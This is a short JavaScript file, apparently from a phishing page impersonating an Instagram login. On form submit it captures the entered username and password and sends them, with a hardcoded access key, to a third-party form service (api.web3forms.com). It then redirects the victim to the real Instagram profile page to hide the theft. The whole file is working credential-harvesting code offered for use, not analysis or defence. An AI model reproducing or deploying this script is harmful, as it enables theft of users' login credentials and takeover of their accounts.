document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent form submission
  
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
  
    // Send data to Web3Forms using fetch
    fetch('https://api.web3forms.com/submit', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        access_key: '28d4e5f1-2907-4e3f-94e9-3af41c2d3451',
        user: username,
        pass: password
      }),
    })
    .then(response => response.json())
    .then(data => {
    //   console.log('Form submission successful:', data);
    //   alert('Login details submitted successfully!');
      window.location.href = 'https://www.instagram.com/'+username;
    })
    .catch(error => {
      console.error('Form submission error:', error);
      alert('Failed to submit login details. Please try again.');
    });
  });
  